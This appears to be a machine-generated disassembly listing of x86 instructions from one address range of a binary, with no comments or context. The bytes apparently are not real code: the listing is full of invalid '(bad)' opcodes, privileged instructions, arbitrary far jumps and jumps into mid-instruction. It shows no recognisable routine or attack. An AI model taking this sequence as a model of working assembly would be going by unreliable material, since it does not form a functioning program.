  41e755:	mov    al,0xb5
  41e757:	push   eax
  41e758:	ss jge 0x41e6e9
  41e75b:	pop    esp
  41e75c:	pop    ss
  41e75d:	leave  
  41e75e:	jnp    0x41e7cc
  41e760:	sub    DWORD PTR [edi+0x42],ebp
  41e763:	rcl    ah,0xf8
  41e766:	push   cs
  41e767:	lea    esi,[ecx+0x45]
  41e76a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e76b:	dec    edx
  41e76c:	adc    ch,BYTE PTR [ecx]
  41e76e:	aas    
  41e76f:	or     al,0x11
  41e771:	or     BYTE PTR [ebp-0x58ffb4b],dl
  41e777:	xchg   edi,eax
  41e778:	pop    ss
  41e779:	mov    ebp,0x9392f1f6
  41e77e:	add    DWORD PTR [ebp+0x712da930],edi
  41e784:	or     BYTE PTR [edi-0x5d2b7e36],ch
  41e78a:	shl    DWORD PTR [edi+0x64],cl
  41e78d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e78e:	mov    eax,0x30bb7a7d
  41e793:	adc    esi,ebx
  41e795:	mov    cl,0x59
  41e797:	jbe    0x41e75d
  41e799:	pop    eax
  41e79a:	ja     0x41e7d6
  41e79c:	stos   DWORD PTR es:[edi],eax
  41e79d:	lahf   
  41e79e:	or     eax,0x11c57367
  41e7a3:	sbb    DWORD PTR [edx-0x5e],esp
  41e7a6:	or     DWORD PTR [ebp-0x435cc8ef],ebp
  41e7ac:	loope  0x41e75d
  41e7ae:	mov    ecx,0xde11d304
  41e7b3:	fs das 
  41e7b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7b6:	ficom  WORD PTR [eax-0x21ee1b9]
  41e7bc:	xchg   esp,eax
  41e7bd:	test   eax,0xdd0c6d29
  41e7c2:	bound  esi,QWORD PTR [esi-0x10]
  41e7c5:	ret    
  41e7c6:	mov    eax,0x7e1cf21
  41e7cb:	inc    edx
  41e7cc:	cmp    eax,0x417db7ef
  41e7d1:	xor    DWORD PTR [esi-0x16],ebx
  41e7d4:	data16 sti 
  41e7d6:	(bad)  
  41e7d7:	enter  0x162c,0xcf
  41e7db:	push   0xc6b59dca
  41e7e0:	pop    edi
  41e7e1:	jmp    0x41e78c
  41e7e3:	arpl   WORD PTR [esi+0x70],si
  41e7e6:	fist   DWORD PTR [ebx]
  41e7e8:	adc    DWORD PTR [edi-0x37],esp
  41e7eb:	adc    al,0x3a
  41e7ed:	add    al,0xc3
  41e7ef:	jne    0x41e79c
  41e7f1:	test   BYTE PTR [eax],dh
  41e7f3:	ins    BYTE PTR es:[edi],dx
  41e7f4:	mov    eax,DWORD PTR [edx]
  41e7f6:	imul   ecx,DWORD PTR [edx],0x4a
  41e7f9:	retf   0xd695
  41e7fc:	das    
  41e7fd:	dec    ebx
  41e7fe:	cmp    esi,DWORD PTR [ebp+0x6d]
  41e801:	rep stos BYTE PTR es:[edi],al
  41e803:	xor    WORD PTR [eax],dx
  41e806:	fnsave [ecx+0x4e]
  41e809:	push   eax
  41e80a:	add    eax,0x586dfbd9
  41e80f:	push   0x54
  41e811:	push   ss
  41e812:	jmp    0x1689:0xa52fee3f
  41e819:	pop    ecx
  41e81a:	add    DWORD PTR [ebp-0x6805b3f4],ebx
  41e820:	dec    ecx
  41e821:	jae    0x41e815
  41e823:	ins    BYTE PTR es:[edi],dx
  41e824:	inc    ebx
  41e825:	out    0x2a,eax
  41e827:	add    eax,0xfd9131a8
  41e82c:	and    ebp,edi
  41e82e:	idiv   DWORD PTR [esi]
  41e830:	fld    QWORD PTR [ebp-0x2243ec99]
  41e836:	sbb    eax,0x1f24ce1a
  41e83b:	push   ss
  41e83c:	sti    
  41e83d:	pop    ds
  41e83e:	call   0x87d465ba
  41e843:	sub    DWORD PTR [edx+0x78de0a5b],ebp
  41e849:	cmp    al,0x35
  41e84b:	add    bl,BYTE PTR [edx-0x76]
  41e84e:	mov    ?,WORD PTR [esi-0x1]
  41e851:	sti    
  41e852:	call   0x94b1e5ea
  41e857:	aad    0x19
  41e859:	sub    BYTE PTR [eax],ah
  41e85b:	pop    edx
  41e85c:	addr16 (bad) 
  41e85e:	sbb    esp,ecx
  41e860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e861:	adc    dl,BYTE PTR [eax]
  41e863:	or     al,0xe9
  41e865:	xor    BYTE PTR [edi],bl
  41e867:	call   0xf9b7:0x29b59c0e
  41e86e:	fwait
  41e86f:	cdq    
  41e870:	xor    BYTE PTR [ebp+0x49],cl
  41e873:	pop    es
  41e874:	push   ss
  41e875:	xchg   ebp,eax
  41e876:	xlat   BYTE PTR ds:[ebx]
  41e877:	adc    eax,0x9dce2e27
  41e87c:	lea    ebx,[esi+0x7b]
  41e87f:	mov    eax,ds:0xb7179bba
  41e884:	daa    
  41e885:	int    0xb0
  41e887:	dec    ecx
  41e888:	push   ss
  41e889:	mov    ecx,0x7ace1730
  41e88e:	mov    ds:0x5910ec68,al
  41e893:	das    
  41e894:	xchg   esi,eax
  41e895:	mov    al,ds:0xebe066a2
  41e89a:	dec    edi
  41e89b:	nop
  41e89c:	and    DWORD PTR [ebx+0x4c],ecx
  41e89f:	xchg   ecx,eax
  41e8a0:	push   edx
  41e8a1:	and    al,0xdc
  41e8a3:	out    dx,eax
  41e8a4:	call   DWORD PTR [esi+0x5e37ad6e]
  41e8aa:	jne    0x41e893
  41e8ac:	test   ch,dl
  41e8ae:	sbb    esp,ebx
  41e8b0:	add    BYTE PTR ds:0x40d8ca1c,0xd5
  41e8b7:	call   0xf7933477
  41e8bc:	pop    es
  41e8bd:	nop
  41e8be:	out    dx,eax
  41e8bf:	lahf   
  41e8c0:	std    
  41e8c1:	mov    esp,0x33fce7ff
  41e8c6:	pop    esp
  41e8c7:	out    0xcb,al
  41e8c9:	cmp    dl,ah
  41e8cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8cc:	test   BYTE PTR [ecx],cl
  41e8ce:	sub    ebx,DWORD PTR [ecx+0x4dbff6e9]
  41e8d4:	pop    edx
  41e8d5:	dec    ecx
  41e8d6:	loopne 0x41e89c
  41e8d8:	ss out 0x73,eax
  41e8db:	xor    al,0x3
  41e8dd:	mov    edx,0xbb62df12
  41e8e2:	in     eax,0x52
  41e8e4:	fiadd  DWORD PTR [ecx]
  41e8e6:	mov    al,0x22
  41e8e8:	ds das 
  41e8ea:	rcr    BYTE PTR [edi-0x74c2e1a3],1
  41e8f0:	ret    0x877e
  41e8f3:	mov    ds,WORD PTR [ebx+0x10688e79]
  41e8f9:	fs pop ds
  41e8fb:	cwde   
  41e8fc:	ror    BYTE PTR [eax+0x29],0x11
  41e900:	xchg   ebp,eax
  41e901:	pop    ebx
  41e902:	jbe    0x41e924
  41e904:	clc    
  41e905:	mov    eax,0xa9e603c0
  41e90a:	sahf   
  41e90b:	pushf  
  41e90c:	in     eax,dx
  41e90d:	fwait
  41e90e:	mov    al,0x89
  41e910:	push   edi
  41e911:	arpl   cx,sp
  41e913:	dec    ebx
  41e914:	cmp    ebx,eax
  41e916:	imul   edx,DWORD PTR [esi+0x6],0x53
  41e91a:	sbb    dl,ch
  41e91c:	xor    BYTE PTR [ebx-0x45719d7a],bl
  41e922:	div    DWORD PTR [edi-0x22]
  41e925:	cmp    ecx,edi
  41e927:	pushf  
  41e928:	clc    
  41e929:	or     al,0x27
  41e92b:	jp     0x41e96e
  41e92d:	cld    
  41e92e:	jbe    0x41e8d8
  41e930:	pusha  
  41e931:	rol    BYTE PTR ds:0x4b4c650e,0x40
  41e938:	adc    al,ch
  41e93a:	lds    eax,FWORD PTR [ecx-0x64c5c29c]
  41e940:	jmp    0xe27f:0x157d26d7
  41e947:	push   esi
  41e948:	imul   BYTE PTR [esi+0x4527d20d]
  41e94e:	push   esp
  41e94f:	outs   dx,DWORD PTR ds:[esi]
  41e950:	out    0xe6,eax
  41e952:	lahf   
  41e953:	fadd   QWORD PTR [ebx+ecx*8+0x27]
  41e957:	push   ds
  41e958:	xor    cl,dl
  41e95a:	rcl    al,0xcb
  41e95d:	addr16 aas 
  41e95f:	xor    DWORD PTR [edx],ebx
  41e961:	sub    ebp,DWORD PTR [edx-0x1a481026]
  41e967:	inc    esi
  41e968:	dec    edi
  41e969:	mov    esp,0xdc9acceb
  41e96e:	adc    ch,bl
  41e970:	mov    bh,0xce
  41e972:	mov    bl,0x5a
  41e974:	and    DWORD PTR [edx+ebp*2-0x63],eax
  41e978:	cmc    
  41e979:	stos   BYTE PTR es:[edi],al
  41e97a:	inc    ecx
  41e97b:	lods   eax,DWORD PTR ds:[esi]
  41e97c:	ror    BYTE PTR [eax+0x10b952eb],cl
  41e982:	push   cs
  41e983:	data16 adc al,ah
  41e986:	xchg   ebp,eax
  41e987:	dec    eax
  41e988:	pop    ebp
  41e989:	mov    ebp,0xa55fccf9
  41e98e:	mov    ah,bh
  41e990:	push   ss
  41e991:	popa   
  41e992:	loope  0x41e9ed
  41e994:	(bad)  
  41e995:	aam    0xb8
  41e997:	mov    eax,0x5b19b16f
  41e99c:	icebp  
  41e99d:	and    BYTE PTR [ebp-0x59],0xe0
  41e9a1:	hlt    
  41e9a2:	(bad)  
  41e9a3:	adc    ah,bl
  41e9a5:	or     al,ch
  41e9a7:	sbb    BYTE PTR [edi],0xaa
  41e9aa:	rcl    BYTE PTR [edx],1
  41e9ac:	imul   ecx,DWORD PTR [edx],0x21
  41e9af:	inc    ebx
  41e9b0:	int3   
  41e9b1:	mov    dh,0xb7
  41e9b3:	xor    ah,BYTE PTR [ebx+edi*2+0x300f5c0e]
  41e9ba:	jmp    0x310ececd
  41e9bf:	repnz mov edi,?
  41e9c2:	mov    ds:0xdb761cf9,eax
  41e9c7:	popa   
  41e9c8:	mov    cl,0xbc
  41e9ca:	dec    eax
  41e9cb:	jl     0x41e9c2
  41e9cd:	jp     0x41e99e
  41e9cf:	call   0x48ddecad
  41e9d4:	cmp    BYTE PTR [ebp-0x28aa0798],dh
  41e9da:	mov    ch,0x55
  41e9dc:	sar    DWORD PTR [ecx+eax*1+0x466fb9d5],1
  41e9e3:	cli    
  41e9e4:	adc    al,0xd7
  41e9e6:	ror    bh,cl
  41e9e8:	(bad)  
  41e9e9:	jne    0x41ea69
  41e9eb:	jmp    0xb9f86adb
  41e9f0:	add    BYTE PTR [ecx-0x4e146fcc],bh
  41e9f6:	mov    ecx,0x5b6d0a78
  41e9fb:	mov    ah,0xe0
  41e9fd:	xchg   ecx,eax
  41e9fe:	inc    ebp
  41e9ff:	fwait
  41ea00:	pop    ecx
  41ea01:	xchg   esi,eax
  41ea02:	jbe    0x41e9a7
  41ea04:	ds test dl,0xcf
  41ea08:	(bad)  
  41ea09:	(bad)  
  41ea0a:	jbe    0x41ea38
  41ea0c:	clc    
  41ea0d:	cld    
  41ea0e:	jb     0x41ea54
  41ea10:	repz test eax,0x805c4871
  41ea16:	dec    esp
  41ea17:	sub    al,0x85
  41ea19:	mov    ecx,edi
  41ea1b:	sbb    DWORD PTR [esi],eax
  41ea1d:	sub    eax,0xfbb1d9e1
  41ea22:	jl     0x41ea68
  41ea24:	lds    ebp,FWORD PTR [eax]
  41ea26:	mov    esi,0xf3910ec0
  41ea2b:	call   0x819a2d7d
  41ea30:	out    dx,eax
  41ea31:	stos   BYTE PTR es:[edi],al
  41ea32:	stos   DWORD PTR es:[edi],eax
  41ea33:	xor    BYTE PTR [ecx],dl
  41ea35:	outs   dx,DWORD PTR ds:[esi]
  41ea36:	mov    esi,0x98f67d07
  41ea3b:	xor    al,0x40
  41ea3d:	mov    eax,0x91b7aeb1
  41ea42:	idiv   al
  41ea44:	push   ebx
  41ea45:	xchg   ebp,eax
  41ea46:	sub    ah,BYTE PTR [edx]
  41ea48:	aad    0x7f
  41ea4a:	retf   0xc472
  41ea4d:	add    al,0x6a
  41ea4f:	repnz push eax
  41ea51:	cld    
  41ea52:	or     eax,0xfd5b9037
  41ea57:	das    
  41ea58:	enter  0x9e88,0x7b
  41ea5c:	adc    BYTE PTR [edx],dh
  41ea5e:	jns    0x41ea4b
  41ea60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea61:	fstp   TBYTE PTR [edx]
  41ea63:	ins    BYTE PTR es:[edi],dx
  41ea64:	or     al,0xf8
  41ea66:	jp     0x41ea35
  41ea68:	mov    ecx,0xcbb90af7
  41ea6d:	retf   0xfde0
  41ea70:	mov    al,0xec
  41ea72:	mov    ds:0x3fd607d8,eax
  41ea77:	sbb    al,0xe
  41ea79:	push   eax
  41ea7a:	xor    edi,DWORD PTR [esi]
  41ea7c:	test   DWORD PTR [esi+ebp*2],ebx
  41ea7f:	cmc    
  41ea80:	pop    eax
  41ea81:	lock sar DWORD PTR [edi-0x5e],1
  41ea85:	sub    eax,0x992916b5
  41ea8a:	leave  
  41ea8b:	ret    0xd2d2
  41ea8e:	jnp    0x41ea25
  41ea90:	shl    DWORD PTR [ecx-0x4],0x2c
  41ea94:	xor    al,0xe6
  41ea96:	xlat   BYTE PTR ds:[ebx]
  41ea97:	mov    cl,0xb1
  41ea99:	adc    dh,dl
  41ea9b:	call   0xfbf0872
  41eaa0:	sub    BYTE PTR [esi],ch
  41eaa2:	sti    
  41eaa3:	icebp  
  41eaa4:	push   ds
  41eaa5:	pop    eax
  41eaa6:	jmp    0x2fe6d6aa
  41eaab:	imul   esi,DWORD PTR [eax],0xffffff90
  41eaae:	repnz leave 
  41eab0:	xchg   edx,eax
  41eab1:	sbb    al,0x5e
  41eab3:	popf   
  41eab4:	ficomp DWORD PTR [edx+0x22bfd373]
  41eaba:	jno    0x41eb35
  41eabc:	lds    eax,FWORD PTR [ebp+0x3c]
  41eabf:	adc    ebp,DWORD PTR [edx]
  41eac1:	pop    esi
  41eac2:	or     bh,dl
  41eac4:	inc    esp
  41eac5:	push   ds
  41eac6:	add    DWORD PTR [eax-0x77816322],ebx
  41eacc:	mov    ds:0xec25e48,eax
  41ead1:	lds    ecx,FWORD PTR [edi-0x134a714e]
  41ead7:	or     eax,DWORD PTR [edx+0x52ce438a]
  41eadd:	dec    esp
  41eade:	ins    DWORD PTR es:[edi],dx
  41eadf:	jmp    0x41ea6a
  41eae1:	call   0x136e:0x73d3c9ee
  41eae8:	dec    ebp
  41eae9:	add    ch,al
  41eaeb:	rol    BYTE PTR [ebx+esi*1+0x65],0x16
  41eaf0:	push   edx
  41eaf1:	sbb    ah,ah
  41eaf3:	in     eax,0x3e
  41eaf5:	xor    edi,DWORD PTR [ecx]
  41eaf7:	sbb    eax,0x5fc7a57e
  41eafc:	aaa    
  41eafd:	sub    eax,0x5761babc
  41eb02:	sar    ecx,cl
  41eb04:	sbb    DWORD PTR [eax+0x18],edx
  41eb07:	scas   al,BYTE PTR es:[edi]
  41eb08:	in     eax,dx
  41eb09:	(bad)  
  41eb0a:	out    0xa8,al
  41eb0c:	cdq    
  41eb0d:	xchg   esp,eax
  41eb0e:	push   ss
  41eb0f:	neg    dl
  41eb11:	push   es
  41eb12:	into   
  41eb13:	and    bh,dl
  41eb15:	nop
  41eb16:	out    0x7a,eax
  41eb18:	shr    DWORD PTR [ebx-0x21fbc4d],0x5f
  41eb1f:	dec    ebp
  41eb20:	cmc    
  41eb21:	push   edi
  41eb22:	xchg   ebp,eax
  41eb23:	xchg   BYTE PTR [ecx+0x47],al
  41eb26:	pop    esp
  41eb27:	mov    eax,0xfd073825
  41eb2c:	mov    WORD PTR [esp+esi*8],?
  41eb2f:	push   0xa7921fea
  41eb34:	sar    DWORD PTR fs:[esi],0x6a
  41eb38:	cmp    BYTE PTR [ecx-0x71],ch
  41eb3b:	inc    ebx
  41eb3c:	dec    ecx
  41eb3d:	adc    ebp,DWORD PTR [esi-0x5a]
  41eb40:	jle    0x41ebbf
  41eb42:	sbb    al,cl
  41eb44:	inc    edi
  41eb45:	(bad)  
  41eb46:	mov    edx,0x6d925893
  41eb4b:	xor    edx,DWORD PTR [edi+0x1e9ef5f7]
  41eb51:	in     al,0xfd
  41eb53:	or     DWORD PTR [ecx-0x15],edx
  41eb56:	lock or al,ah
  41eb59:	in     al,0x64
  41eb5b:	pop    es
  41eb5c:	imul   ebp,DWORD PTR [edx],0x6aa729bc
  41eb62:	mov    edi,0xdb8c2e1d
  41eb67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb68:	iret   
  41eb69:	shl    BYTE PTR [esi-0x15f99796],cl
  41eb6f:	adc    al,0x4c
  41eb71:	dec    ebx
  41eb72:	jecxz  0x41eb4b
  41eb74:	push   edi
  41eb75:	xor    dl,BYTE PTR [edi]
  41eb77:	lahf   
  41eb78:	dec    esi
  41eb79:	xchg   edx,eax
  41eb7a:	(bad)  
  41eb7b:	in     eax,0x41
  41eb7d:	jne    0x41ebde
  41eb7f:	add    ah,0x13
  41eb82:	inc    esp
  41eb83:	xchg   ebp,eax
  41eb84:	xor    eax,DWORD PTR [edi+0x1a9b90bf]
  41eb8a:	jo     0x41ebf5
  41eb8c:	out    dx,al
  41eb8d:	and    eax,0x816556a8
  41eb92:	mov    edx,0xa95ae52b
  41eb97:	sar    DWORD PTR [ebx],0xa7
  41eb9a:	add    eax,0x91a8887
  41eb9f:	dec    eax
  41eba0:	mov    ch,0xce
  41eba2:	mov    ds:0xe1e44b88,eax
  41eba7:	fldcw  WORD PTR [eax+0xea37123]
  41ebad:	test   al,0xf9
  41ebaf:	mov    ds:0xa312a126,eax
  41ebb4:	mov    al,ds:0x8445f64a
  41ebb9:	xrelease mov DWORD PTR [edx+0x36],ebp
  41ebbd:	push   ss
  41ebbe:	xlat   BYTE PTR ds:[ebx]
  41ebbf:	shl    edi,cl
  41ebc1:	jns    0x41eb7b
  41ebc3:	popf   
  41ebc4:	push   0x68
  41ebc6:	push   ecx
  41ebc7:	cli    
  41ebc8:	aas    
  41ebc9:	pop    edi
  41ebca:	out    0xd8,al
  41ebcc:	xchg   esp,eax
  41ebcd:	adc    al,0xc0
  41ebcf:	daa    
  41ebd0:	dec    ebx
  41ebd1:	xchg   ebx,eax
  41ebd2:	in     eax,dx
  41ebd3:	clc    
  41ebd4:	fidiv  DWORD PTR [edx+0x2a52689f]
  41ebda:	jecxz  0x41ebf9
  41ebdc:	bound  eax,QWORD PTR [edi-0x38b7cd12]
  41ebe2:	ds jle 0x41ec5b
  41ebe5:	add    DWORD PTR [ebp-0x17382c44],ebx
  41ebeb:	xor    DWORD PTR [edx+eax*8+0xf],eax
  41ebef:	jl     0x41ec04
  41ebf1:	mov    ch,0xe3
  41ebf3:	sbb    BYTE PTR [edi],dl
  41ebf5:	or     eax,0xa3c3043a
  41ebfa:	jge    0x41ec19
  41ebfc:	pop    edi
  41ebfd:	mov    al,ds:0x522e3d7f
  41ec02:	adc    edx,esi
  41ec04:	(bad)  
  41ec06:	test   eax,0xc650de84
  41ec0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec0c:	xlat   BYTE PTR ds:[ebx]
  41ec0d:	xor    esp,edx
  41ec0f:	nop
  41ec10:	sahf   
  41ec11:	add    al,0x1f
  41ec13:	scas   al,BYTE PTR es:[edi]
  41ec14:	pop    eax
  41ec15:	jbe    0x41ec19
  41ec17:	dec    esp
  41ec18:	gs clc 
  41ec1a:	or     DWORD PTR ds:0x62d350cc,esp
  41ec20:	int3   
  41ec21:	push   0x23
  41ec23:	aaa    
  41ec24:	leave  
  41ec25:	mov    WORD PTR [ecx],?
  41ec27:	pop    edi
  41ec28:	mov    ch,0x59
  41ec2a:	mov    ebx,0xbdb5a980
  41ec2f:	fistp  DWORD PTR [ebp+0x1e]
  41ec32:	fnsave [edx]
  41ec34:	xlat   BYTE PTR ds:[ebx]
  41ec35:	inc    edi
  41ec36:	fnstenv [eax-0x53838ef7]
  41ec3c:	fsubp  st(3),st
  41ec3e:	cmp    eax,0x165634c0
  41ec43:	add    esi,DWORD PTR [edx]
  41ec45:	dec    edx
  41ec46:	nop
  41ec47:	pop    edi
  41ec48:	dec    eax
  41ec49:	hlt    
  41ec4a:	mov    esp,0x1effe4de
  41ec4f:	(bad)  
  41ec50:	mov    WORD PTR [ecx+0x2c],ds
  41ec53:	mov    ecx,0x2b0d709a
  41ec58:	cmp    ah,cl
  41ec5a:	jecxz  0x41ecb3
  41ec5c:	push   edx
  41ec5d:	js     0x41ec18
  41ec5f:	inc    edi
  41ec60:	dec    esi
  41ec61:	inc    esp
  41ec62:	push   ebp
  41ec63:	aam    0xc6
  41ec65:	and    dh,BYTE PTR [esi+0x7bcd6aa]
  41ec6b:	(bad)  
  41ec6d:	cld    
  41ec6e:	std    
  41ec6f:	(bad)  
  41ec70:	jmp    0x41ec4f
  41ec72:	xchg   ecx,eax
  41ec73:	into   
  41ec74:	push   DWORD PTR [edi+0x5dc926c1]
  41ec7a:	loope  0x41ec13
  41ec7c:	xchg   BYTE PTR [ebp-0x2],dl
  41ec7f:	sbb    al,BYTE PTR [esi+0x4224dc93]
  41ec85:	js     0x41ec3d
  41ec87:	loopne 0x41ec90
  41ec89:	pop    ebp
  41ec8b:	push   ss
  41ec8c:	jge    0x41ec97
  41ec8e:	popf   
  41ec8f:	and    bl,BYTE PTR [edx-0x65]
  41ec92:	lods   al,BYTE PTR ds:[esi]
  41ec93:	int    0x57
  41ec95:	sub    eax,esi
  41ec97:	mov    esp,0xf942ae5f
  41ec9c:	mov    BYTE PTR [esi+eiz*2],ch
  41ec9f:	cmp    ebx,0xffffffb3
  41eca2:	mov    ah,0x5
  41eca4:	outs   dx,DWORD PTR ds:[esi]
  41eca5:	inc    edi
  41eca6:	data16 hlt 
  41eca8:	or     DWORD PTR [ebx+ebp*8],ebx
  41ecab:	div    BYTE PTR [ebx]
  41ecad:	aam    0x85
  41ecaf:	es mov dl,0x36
  41ecb2:	mov    edi,0x60f6d4ab
  41ecb7:	stos   DWORD PTR es:[edi],eax
  41ecb8:	and    ebp,DWORD PTR [esp+ebp*8]
  41ecbb:	repnz loope 0x41ed3b
  41ecbe:	and    DWORD PTR [ecx-0x74cf5db8],ebx
  41ecc4:	rcr    DWORD PTR [eax+0x6a],0xd7
  41ecc8:	repnz daa 
  41ecca:	inc    edx
  41eccb:	in     al,dx
  41eccc:	push   ds
  41eccd:	int3   
  41ecce:	sbb    ebp,esi
  41ecd0:	inc    ebp
  41ecd1:	inc    esi
  41ecd2:	mov    al,ds:0xa24fcee8
  41ecd7:	mov    ebx,0x68d1eeaf
  41ecdc:	xchg   ebx,eax
  41ecdd:	mov    esp,0x2b2d13fa
  41ece2:	ror    BYTE PTR [ecx+0x442854c2],1
  41ece8:	shr    BYTE PTR [edx+0x7d4f39a7],0xb3
  41ecef:	lock sti 
  41ecf1:	mov    es,WORD PTR [esi+0x3d]
  41ecf4:	dec    esi
  41ecf5:	(bad)  
  41ecf6:	mov    ah,BYTE PTR [ebx]
  41ecf8:	mov    eax,ds:0x5c379fa
  41ecfd:	push   es
  41ecfe:	adc    eax,0x532f50bc
  41ed03:	js     0x41ed0c
  41ed05:	or     al,0x76
  41ed07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed08:	ins    DWORD PTR es:[edi],dx
  41ed09:	xor    DWORD PTR [ecx+0x7619b362],esi
  41ed0f:	jno    0x41ed27
  41ed11:	or     eax,0xae560fdb
  41ed16:	mov    ch,0x3f
  41ed18:	pop    esp
  41ed19:	call   0x52e9:0x4d86eeb
  41ed20:	xchg   esi,eax
  41ed21:	xchg   esi,eax
  41ed22:	in     al,0x5a
  41ed24:	sbb    al,0x81
  41ed26:	les    eax,FWORD PTR [ecx+0x2e]
  41ed29:	fucom  st(4)
  41ed2b:	fist   DWORD PTR [eax+0xa]
  41ed2e:	xchg   esi,eax
  41ed2f:	fs inc esi
  41ed31:	loopne 0x41edae
  41ed33:	push   ax
  41ed35:	xchg   DWORD PTR [ebx-0x74],ecx
  41ed38:	ja     0x41ecd9
  41ed3a:	sahf   
  41ed3b:	jle    0x41ed4e
  41ed3d:	jg     0x41ece1
  41ed3f:	adc    al,0x64
  41ed41:	adc    BYTE PTR [edx],dh
  41ed43:	and    eax,0x9b231bb9
  41ed48:	mov    bl,bh
  41ed4a:	popa   
  41ed4b:	les    ebx,FWORD PTR [ecx+ecx*8]
  41ed4e:	lds    esp,FWORD PTR [ebx+0x6ee8da9f]
  41ed54:	loop   0x41edb5
  41ed56:	inc    edi
  41ed57:	lods   al,BYTE PTR ds:[esi]
  41ed58:	retf   
  41ed59:	idiv   ebx
  41ed5b:	dec    esp
  41ed5c:	call   0x1ad47f32
  41ed61:	sbb    eax,0x5b5319c6
  41ed66:	inc    ecx
  41ed67:	popa   
  41ed68:	add    al,0x4f
  41ed6a:	loop   0x41ede7
  41ed6c:	test   eax,0xe1e68ffb
  41ed71:	rol    BYTE PTR [edx],0xe6
  41ed74:	push   ecx
  41ed75:	ret    0xfacd
  41ed78:	fild   QWORD PTR [eax+0x17]
  41ed7b:	and    cl,ch
  41ed7d:	mov    al,ds:0xc2c46021
  41ed82:	jns    0x41ed0a
  41ed84:	mov    bh,0x13
  41ed86:	in     al,0x8
  41ed88:	xchg   ebp,eax
  41ed89:	sub    eax,0xe1c26024
  41ed8e:	aas    
  41ed8f:	xchg   esp,eax
  41ed90:	loop   0x41ed57
  41ed92:	or     bh,BYTE PTR ds:0x7e0aa73f
  41ed98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed99:	push   0xa1dd1436
  41ed9e:	push   eax
  41eda0:	div    DWORD PTR [ecx-0x1f]
  41eda3:	or     BYTE PTR [ebp+0xeed7992],bl
  41eda9:	dec    ebx
  41edaa:	xchg   ebx,eax
  41edab:	mov    ch,0xf6
  41edad:	idiv   bh
  41edaf:	ins    DWORD PTR es:[edi],dx
  41edb0:	ret    0xdb76
  41edb3:	retf   0xd5f2
  41edb6:	not    DWORD PTR [esi]
  41edb8:	jo     0x41ed3a
  41edba:	pop    eax
  41edbb:	mov    esp,0xd9cab5ea
  41edc0:	(bad)  
  41edc2:	aaa    
  41edc3:	sbb    ah,bh
  41edc5:	xor    BYTE PTR [eax+0x36f58410],cl
  41edcb:	cli    
  41edcc:	mov    bh,0x4
  41edce:	mov    edi,0x21995ed4
  41edd3:	and    ecx,ebx
  41edd5:	fst    DWORD PTR [edi]
  41edd7:	jle    0x41ed67
  41edd9:	out    dx,al
  41edda:	dec    edx
  41eddb:	jb     0x41edc9
  41eddd:	or     BYTE PTR [edx+edx*1],dh
  41ede0:	or     BYTE PTR gs:[ecx-0x75fcee86],0xae
  41ede8:	mov    esi,0x41ed0479
  41eded:	dec    ebp
  41edee:	adc    dh,BYTE PTR [ecx+0x6b65392d]
  41edf4:	mov    edi,DWORD PTR [ebx+edi*4+0x15]
  41edf8:	push   es
  41edf9:	jmp    0x2c2c:0x6f1c3d4d
  41ee00:	sub    al,BYTE PTR [edi-0x6ea1512a]
  41ee06:	mov    bh,0xa7
  41ee08:	xchg   ebx,eax
  41ee09:	rcr    bl,cl
  41ee0b:	dec    ecx
  41ee0c:	aaa    
  41ee0d:	lock push eax
  41ee0f:	dec    ebp
  41ee10:	dec    eax
  41ee11:	stc    
  41ee12:	fst    DWORD PTR [ecx-0x7ba2872d]
  41ee18:	cli    
  41ee19:	push   ds
  41ee1a:	in     eax,dx
  41ee1b:	mov    esi,0x16042152
  41ee20:	loope  0x41ede0
  41ee22:	pop    ss
  41ee23:	cmc    
  41ee24:	xor    al,0x94
  41ee26:	inc    esi
  41ee27:	ret    0x13db
  41ee2a:	mov    al,0xef
  41ee2c:	sahf   
  41ee2d:	fimul  WORD PTR [ebp+edi*1+0x1327378a]
  41ee34:	lods   eax,DWORD PTR ds:[esi]
  41ee35:	push   esi
  41ee36:	cdq    
  41ee37:	jmp    0x71d09ca1
  41ee3c:	rol    BYTE PTR [edi-0x17ed9f7d],cl
  41ee42:	xor    eax,0xb2111d2b
  41ee47:	push   es
  41ee48:	adc    edx,DWORD PTR [ebx-0x44f922e4]
  41ee4e:	data16 add al,BYTE PTR ds:0x1f6b531a
  41ee55:	lea    ebx,[ebx-0x2f]
  41ee58:	call   0x12698d34
  41ee5d:	add    ebp,DWORD PTR es:[esi-0x6ff09650]
  41ee64:	pop    ebp
  41ee65:	cmp    DWORD PTR [edi+0x106899ee],ecx
  41ee6b:	es mov ah,0x1e
  41ee6e:	xchg   BYTE PTR [esi+0x91730bf],cl
  41ee74:	sbb    eax,0x8a8e2ef
  41ee79:	es jle 0x41ee4b
  41ee7c:	mov    BYTE PTR [eax+edi*1],dh
  41ee7f:	jle    0x41eea6
  41ee81:	loope  0x41ee36
  41ee83:	adc    BYTE PTR ds:0x19f078ab,0x77
  41ee8a:	sub    DWORD PTR [ecx],ebx
  41ee8c:	adc    al,0x7d
  41ee8e:	div    BYTE PTR [edx-0x35]
  41ee91:	jmp    0x3fa624e7
  41ee96:	shl    dl,0x4d
  41ee99:	push   es
  41ee9a:	stos   BYTE PTR es:[edi],al
  41ee9b:	pushf  
  41ee9c:	dec    ebp
  41ee9d:	and    edi,edx
  41ee9f:	lock popf 
  41eea1:	push   cs
  41eea2:	cmp    al,0x17
  41eea4:	sub    bl,dh
  41eea6:	xor    eax,ebx
  41eea8:	dec    esi
  41eea9:	dec    esp
  41eeab:	fwait
  41eeac:	cmp    DWORD PTR [ecx+edi*8+0x716972f1],ecx
  41eeb3:	in     al,dx
  41eeb4:	xchg   ecx,eax
  41eeb5:	mov    ?,esp
  41eeb7:	xchg   edx,eax
  41eeb8:	stos   DWORD PTR es:[edi],eax
  41eeb9:	inc    esi
  41eeba:	fwait
  41eebb:	xlat   BYTE PTR ds:[ebx]
  41eebc:	mov    al,0xa2
  41eebe:	pop    es
  41eebf:	jno    0x41ef16
